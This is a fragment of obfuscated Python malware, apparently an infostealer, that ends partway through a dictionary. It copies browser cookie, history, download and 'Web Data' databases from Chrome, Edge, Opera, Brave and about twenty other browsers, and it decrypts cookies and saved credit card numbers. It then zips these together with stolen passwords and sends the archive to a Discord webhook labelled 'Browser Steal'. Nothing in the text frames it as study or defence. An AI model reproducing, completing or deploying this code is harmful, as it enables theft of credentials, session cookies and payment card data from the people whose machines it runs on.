    def CKDPQEJZSEMSHTTRHIISRWCOELTFQORVFBUSQIQXSFXYYFYECUTRFAXVGX(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS):
        XQETRBPABOEHGCVJGDVXKTJMHAOHKZVNKLLYENNZHNBYJFZOVJCLVYOBZMQBNKHKZ = os.path.join(IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, 'Network', 'Cookies')
        if not os.path.exists(XQETRBPABOEHGCVJGDVXKTJMHAOHKZVNKLLYENNZHNBYJFZOVJCLVYOBZMQBNKHKZ):
            return

        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(XQETRBPABOEHGCVJGDVXKTJMHAOHKZVNKLLYENNZHNBYJFZOVJCLVYOBZMQBNKHKZ)
        disk_conn.backup(NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP)
        disk_conn.close()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO = NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.cursor()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            XSOSJXIZJQCRAYKJVOHUUHOGQEQIVKLNOEWMWJVYXCHAKEGYPDPXRASNQOXIXZALVRBWINCLJCIWIY =          f"- Url     : {v4r_row[0]}"
            DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT =         f"  Name    : {v4r_row[1]}"
            RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN =         f"  Path    : {v4r_row[2]}"
            GIYLVECNVLKQAEAAYILJCZCJSVBKIZBJELNBZTUVSBHRCTFAEWMKMIAYBVQLYPJEGYHZGSMTRWQSRAMIFXHVCEDGLRFEVL =       f"  Cookie  : {RSODLEXREZDWTKEPIXCLEYGNALIJNMLBLSUROHQMMGZTRRUEHSUGPFSIHKGZFOTJOQSTL(v4r_row[3], EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS)}"
            QJIHQCMJKQBTUSMYZFHRQOSUPPIJMLSRHLYEFOOWVNJJJZUEIMOVXMIYCMPZTX =       f"  Expire  : {v4r_row[4]}"
            JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name = f"  Browser : {JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX}"
            QVGZHDHJCLQSMHPOXYMRPYNZGXDCHPKICJCKKKDREFEBBWCXKVZ.append(f"{XSOSJXIZJQCRAYKJVOHUUHOGQEQIVKLNOEWMWJVYXCHAKEGYPDPXRASNQOXIXZALVRBWINCLJCIWIY}\n{DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT}\n{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}\n{GIYLVECNVLKQAEAAYILJCZCJSVBKIZBJELNBZTUVSBHRCTFAEWMKMIAYBVQLYPJEGYHZGSMTRWQSRAMIFXHVCEDGLRFEVL}\n{QJIHQCMJKQBTUSMYZFHRQOSUPPIJMLSRHLYEFOOWVNJJJZUEIMOVXMIYCMPZTX}\n{JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name}\n")

        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.close()

    def KJJBXAESWTSXXPGZBPRREYSBWKPFPBNWSDLZUZKDNNVPOPPKZRNQDAWFDAXKJTNWKCUDOXCCISQQFMUD(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE):
        YHDPQSEEWESUVJLKGSZFBJUYSIUGTLLFJRSDWVLAJZFDAZIBASQCEHFRPYFOHMWYUYIENDSLAMVETUOCEHNXHSDPFNUNYYAKX = os.path.join(IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, 'History')
        if not os.path.exists(YHDPQSEEWESUVJLKGSZFBJUYSIUGTLLFJRSDWVLAJZFDAZIBASQCEHFRPYFOHMWYUYIENDSLAMVETUOCEHNXHSDPFNUNYYAKX):
            return
        
        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(YHDPQSEEWESUVJLKGSZFBJUYSIUGTLLFJRSDWVLAJZFDAZIBASQCEHFRPYFOHMWYUYIENDSLAMVETUOCEHNXHSDPFNUNYYAKX)
        disk_conn.backup(NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP)
        disk_conn.close()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO = NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.cursor()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            XSOSJXIZJQCRAYKJVOHUUHOGQEQIVKLNOEWMWJVYXCHAKEGYPDPXRASNQOXIXZALVRBWINCLJCIWIY =          f"- Url     : {v4r_row[0]}"
            BJVOTNBVNODTJNMDHVETZIYOJKKNFRKWCIQQCWVSTNGMUVJYBJYJQIGKKKSRDACVIILYJJKUZZIF =        f"  Title   : {v4r_row[1]}"
            EMDOKFQJYTKJNWCRAIBAVBPAZNBXBTLJMIWIBQHUILQUQGIIVWHMDHSNXCOBYYZXCEGNZQPAELDMZV =         f"  Time    : {v4r_row[2]}"
            JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name = f"  Browser : {JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX}"
            QTRZVXYQWKPXPUVIKJERWAVLQJSKXCHZLQZNSEIIFOJEUWPTYFHXUNWUCTMGGBZYN.append(f"{XSOSJXIZJQCRAYKJVOHUUHOGQEQIVKLNOEWMWJVYXCHAKEGYPDPXRASNQOXIXZALVRBWINCLJCIWIY}\n{BJVOTNBVNODTJNMDHVETZIYOJKKNFRKWCIQQCWVSTNGMUVJYBJYJQIGKKKSRDACVIILYJJKUZZIF}\n{EMDOKFQJYTKJNWCRAIBAVBPAZNBXBTLJMIWIBQHUILQUQGIIVWHMDHSNXCOBYYZXCEGNZQPAELDMZV}\n{JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name}\n")

        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.close()

    def DMMOWEDXFFCEZEQXUHETNSCAXDTWGWGNJQGJLEYJLDZJXJBRHGWUDQGSODEJRYHCPFGDBWNVIFXTFXQBYDK(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE):
        NJTNTCIYYLNOQYHIKUGKKPLFGKIZCTFNQPJAMYUJQMLWUEMCKSDECGTPBYOKXFNQBZESRYUJAABDISSUJYUWXEODTKO = os.path.join(IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, 'History')
        if not os.path.exists(NJTNTCIYYLNOQYHIKUGKKPLFGKIZCTFNQPJAMYUJQMLWUEMCKSDECGTPBYOKXFNQBZESRYUJAABDISSUJYUWXEODTKO):
            return

        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(NJTNTCIYYLNOQYHIKUGKKPLFGKIZCTFNQPJAMYUJQMLWUEMCKSDECGTPBYOKXFNQBZESRYUJAABDISSUJYUWXEODTKO)
        disk_conn.backup(NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP)
        disk_conn.close()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO = NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.cursor()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.execute('SELECT tab_url, target_path FROM downloads')
        for row in IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.fetchall():
            if not row[0] or not row[1]:
                continue
            RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN =         f"- Path    : {row[1]}"
            XSOSJXIZJQCRAYKJVOHUUHOGQEQIVKLNOEWMWJVYXCHAKEGYPDPXRASNQOXIXZALVRBWINCLJCIWIY =          f"  Url     : {row[0]}"
            JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name = f"  Browser : {JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX}"
            GYARZCWKUSOAFVXFATWAXQLHHMVLPUIKEDERKMQCCTXWIZPKXPSAWOXFVLCJRXWDBFGBVPJDMHHVVBOOXFDEZFQDEBBX.append(f"{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}\n{XSOSJXIZJQCRAYKJVOHUUHOGQEQIVKLNOEWMWJVYXCHAKEGYPDPXRASNQOXIXZALVRBWINCLJCIWIY}\n{JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name}\n")

        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.close()

    def TIWRROHRQQMTSNAHTYIPVEOCRZJTNIZHEAPDFZBUJUENYJOZNSDMNISORLQJBONNFJIEJROCECSIWHOFGXUIBL(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS):
        ERYGARSGBRZOSUNIDYNHXGGVMNAYWUOSKQNAEZKBFUNHZMXKVPWPMMUZPNTNTVLGDZNOSZHKXNTDDEPPGYL = os.path.join(IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, 'Web Data')
        if not os.path.exists(ERYGARSGBRZOSUNIDYNHXGGVMNAYWUOSKQNAEZKBFUNHZMXKVPWPMMUZPNTNTVLGDZNOSZHKXNTDDEPPGYL):
            return

        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(ERYGARSGBRZOSUNIDYNHXGGVMNAYWUOSKQNAEZKBFUNHZMXKVPWPMMUZPNTNTVLGDZNOSZHKXNTDDEPPGYL)
        disk_conn.backup(NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP)
        disk_conn.close()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO = NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.cursor()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT =             f"- Name             : {v4r_row[0]}"
            WJEGULTXNZLNGCIFXGXGMXIGMIXHVHCXEWNKGDATYXLJSYOOIOUGJWMRLOHIBAVTSICXEQPQNHAOZCHYJJVYQZK = f"  Expiration Month : {v4r_row[1]}"
            IVBQPKFFDTTKOSHWEAVPWUCMRWOHTNAXAFUCSXOAKFVADDRNBVAAUQYFHKEERSVPWJXRF =  f"  Expiration Year  : {v4r_row[2]}"
            CSKYIEAEKZHMFAKVBJZPHYIGJYZMCPXYKJOBQQOFMYAJRKRSCEFULGUVCUANJFAOXXDMHUX =      f"  Card Number      : {RSODLEXREZDWTKEPIXCLEYGNALIJNMLBLSUROHQMMGZTRRUEHSUGPFSIHKGZFOTJOQSTL(v4r_row[3], EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS)}"
            IRUGQEWUSXYPPHFSQMXVSABTUGXRLHTOPYRENVWLWAMODFKKIXDFJZASGGIACOCEKLINYZWXAQVRFPBKYRVDPLO =    f"  Date Modified    : {v4r_row[4]}"
            JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name =     f"  Browser          : {JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX}"
            RRZIMTMCXRZUOFBLMNJAJFRXLZEUXLBRBWOCAVDGDCQDVWVWQQCERIYRPUXCTCQSQNXWDQWENAZVOIWXGSPSNJVS.append(f"{DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT}\n{WJEGULTXNZLNGCIFXGXGMXIGMIXHVHCXEWNKGDATYXLJSYOOIOUGJWMRLOHIBAVTSICXEQPQNHAOZCHYJJVYQZK}\n{IVBQPKFFDTTKOSHWEAVPWUCMRWOHTNAXAFUCSXOAKFVADDRNBVAAUQYFHKEERSVPWJXRF}\n{CSKYIEAEKZHMFAKVBJZPHYIGJYZMCPXYKJOBQQOFMYAJRKRSCEFULGUVCUANJFAOXXDMHUX}\n{IRUGQEWUSXYPPHFSQMXVSABTUGXRLHTOPYRENVWLWAMODFKKIXDFJZASGGIACOCEKLINYZWXAQVRFPBKYRVDPLO}\n{JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name}\n")
        
        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.close()

    def FTXMUWPNJTKPHTRQGPGUBGOEOTPFLMUGAFYMPLISRIFZDKCMYQRXXYSHUIPSNWRRXOEKJYHOQPRAPHUSWO(XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC):
        files_in_memory = {}

        if STTZRJWCCHHUMBEJPIOXFBZXQFKZYGWSXQFSOBAZECYLFKRYIXM:
            files_in_memory[f"Passwords_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt"] = '\n'.join(STTZRJWCCHHUMBEJPIOXFBZXQFKZYGWSXQFSOBAZECYLFKRYIXM)

        if QVGZHDHJCLQSMHPOXYMRPYNZGXDCHPKICJCKKKDREFEBBWCXKVZ:
            files_in_memory[f"Cookies_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt"] = '\n'.join(QVGZHDHJCLQSMHPOXYMRPYNZGXDCHPKICJCKKKDREFEBBWCXKVZ)

        if QTRZVXYQWKPXPUVIKJERWAVLQJSKXCHZLQZNSEIIFOJEUWPTYFHXUNWUCTMGGBZYN:
            files_in_memory[f"History_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt"] = '\n'.join(QTRZVXYQWKPXPUVIKJERWAVLQJSKXCHZLQZNSEIIFOJEUWPTYFHXUNWUCTMGGBZYN)

        if GYARZCWKUSOAFVXFATWAXQLHHMVLPUIKEDERKMQCCTXWIZPKXPSAWOXFVLCJRXWDBFGBVPJDMHHVVBOOXFDEZFQDEBBX:
            files_in_memory[f"Downloads_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt"] = '\n'.join(GYARZCWKUSOAFVXFATWAXQLHHMVLPUIKEDERKMQCCTXWIZPKXPSAWOXFVLCJRXWDBFGBVPJDMHHVVBOOXFDEZFQDEBBX)

        if RRZIMTMCXRZUOFBLMNJAJFRXLZEUXLBRBWOCAVDGDCQDVWVWQQCERIYRPUXCTCQSQNXWDQWENAZVOIWXGSPSNJVS:
            files_in_memory[f"Cards_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt"] = '\n'.join(RRZIMTMCXRZUOFBLMNJAJFRXLZEUXLBRBWOCAVDGDCQDVWVWQQCERIYRPUXCTCQSQNXWDQWENAZVOIWXGSPSNJVS)

        zip_in_memory = io.BytesIO()
        with zipfile.ZipFile(zip_in_memory, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename, file_content in files_in_memory.items():
                zipf.writestr(filename, file_content)
        
        zip_in_memory.seek(0)
        return zip_in_memory

    def AVMATKWALFDAWMLKXXZRQHAFROGOXEAWHYPAUWGGEBWFGIIJDVT(XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC, zip_in_memory):
        CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK = SyncWebhook.from_url(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ)
        CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK.send(
            embed=Embed(
                title=f'Browser Steal {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:',
                description=f"Found In **{'**, **'.join(BDTVTCMYZJLVNNQMMBIOZKKLHSOFVTAOATULGWDODMQUZDBJTYJIAGVCAKATQDTEATAGTVCNYKVSCPBBGBARKGVFNH)}**: ```📂 - Browser_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.zip\n├── 📄 - Cards_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt\n├── 📄 - Cookies_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt\n├── 📄 - Downloads_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt\n├── 📄 - History_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt\n└── 📄 - Passwords_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.txt```",
                color=EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW,
            ).set_footer(
                text=GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY,
                icon_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ
            ),
            file=File(fp=zip_in_memory, filename=f"Browser_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.zip"), 
            username=BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS, avatar_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ
        )
        
    BIOTVBAOWYEWLBIYDEOMAKVJATPGVNUJWNVSDUTJAKKSVEKAIWXS = {
        'Google Chrome': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Vivaldi', 'User Data'),
        'Internet Explorer': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Microsoft', 'Internet Explorer'),
        'Amigo': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Amigo', 'User Data'),
        'Torch': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Torch', 'User Data'),
        'Kometa': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Orbitum', 'User Data'),
        'Cent Browser': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'CentBrowser', 'User Data'),
        '7Star': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Sputnik', 'Sputnik', 'User Data'),
        'Google Chrome SxS': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Google', 'Chrome SxS', 'User Data'),
        'Epic Privacy Browser': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Epic Privacy Browser', 'User Data'),
        'Uran': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'uCozMedia', 'Uran', 'User Data'),
        'Yandex': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI, 'Iridium', 'User Data'),
        'Mozilla Firefox': os.path.join(QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY, 'Mozilla', 'Firefox', 'Profiles'),
        'Safari': os.path.join(QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY, 'Apple Computer', 'Safari'),
    }

    BIOTVBAOWYEWLBIYDEOMAKVJATPGVNUJWNVSDUTJAKKSVEKAIWXS_Processes = {
        'Google Chrome': 'chrome.exe',
        'Microsoft Edge': 'msedge.exe',
        'Opera': 'opera.exe',
        'Opera GX': 'opera.exe',
        'Brave': 'brave.exe',
        'Vivaldi': 'vivaldi.exe',
        'Internet Explorer': 'iexplore.exe',
        'Amigo': 'amigo.exe',
        'Torch': 'torch.exe',
        'Kometa': 'kometa.exe',
        'Orbitum': 'orbitum.exe',
        'Cent Browser': 'centbrowser.exe',
        '7Star': '7star.exe',
        'Sputnik': 'sputnik.exe',
        'Google Chrome SxS': 'chrome.exe',
        'Epic Privacy Browser': 'epic.exe',
        'Uran': 'uran.exe',
        'Yandex': 'yandex.exe',
        'Iridium': 'iridium.exe',
